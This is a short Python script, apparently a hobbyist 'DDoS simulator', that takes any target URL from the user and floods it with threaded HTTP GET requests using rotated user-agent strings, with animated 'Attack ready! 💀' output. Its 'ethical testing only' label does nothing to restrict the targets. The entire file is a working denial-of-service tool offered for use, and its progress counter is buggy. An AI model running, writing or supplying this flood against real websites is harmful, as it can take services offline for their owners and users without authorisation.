import requests
import threading
import time
import random
import sys

# Animation functions
def loading_animation():
    chars = "/-\\|"
    for i in range(20):
        sys.stdout.write(f'\rLoading attack... {chars[i % 4]}')
        sys.stdout.flush()
        time.sleep(0.1)
    print("\nAttack ready! 💀")

def progress_bar(current, total):
    bar_length = 20
    filled = int(bar_length * current // total)
    bar = '█' * filled + '-' * (bar_length - filled)
    print(f'\rProgress: |{bar}| {current}/{total} ({current/total*100:.1f}%)', end='', flush=True)

# DDoS simulation (ethical testing only)
def flood_thread(target_url, thread_id, num_requests):
    for i in range(num_requests):
        try:
            headers = {'User-Agent': random.choice(['Mozilla/5.0', 'Chrome/91.0'])}
            response = requests.get(target_url, headers=headers)
            print(f'\rThread {thread_id}: Request {i+1} - Status: {response.status_code}', end='', flush=True)
        except Exception as e:
            print(f'\rThread {thread_id}: Error - {e}', end='', flush=True)
        time.sleep(0.01)  # Ultra-speed
    progress_bar(completed_requests[0] + num_requests, total_requests)

# Main
if __name__ == "__main__":
    print("God-Level DDoS Simulator (Ethical Testing Only)")
    target_url = input("Enter target URL: ")
    num_threads = int(input("Enter number of threads: "))
    num_requests = int(input("Enter requests per thread: "))

    loading_animation()  # Animation pennana

    total_requests = num_threads * num_requests
    completed_requests = [0]  # Mutable for threading

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=flood_thread, args=(target_url, i, num_requests))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\nAttack complete! 💀")
